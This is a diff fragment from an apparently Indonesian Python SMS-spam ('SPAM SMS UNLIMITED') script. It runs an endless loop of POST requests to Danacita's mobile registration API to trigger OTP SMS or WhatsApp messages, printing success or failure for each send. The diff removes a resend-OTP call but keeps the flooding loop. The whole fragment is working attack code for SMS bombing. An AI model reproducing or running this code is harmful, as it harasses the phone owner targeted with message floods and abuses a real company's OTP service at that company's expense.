@@ -85,15 +85,10 @@ print(f"{W}[{hijau}• SPAM SMS UNLIMITED{kuning}•{hijau}•{W}]")
 while True:
     headers_danacita = generate_headers()
     response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
-    response_resendotp = requests.post("https://api.danacita.co.id/users/resend_otp/", headers=headers_danacita, data=data_resendotp)
     
     if response_danacita.status_code == 200:
         print(f"{G}Berhasil mengirim SMS/WA via Danacita")
     else:
         print(f"{R}Gagal mengirim SMS/WA via Danacita")
-        
-    if response_resendotp.status_code == 200:
-        print(f"{G}Berhasil resend SMS/WA via Danacita")
-    else:
-        print(f"{R}Gagal resend SMS/WA via Danacita")
+    
     
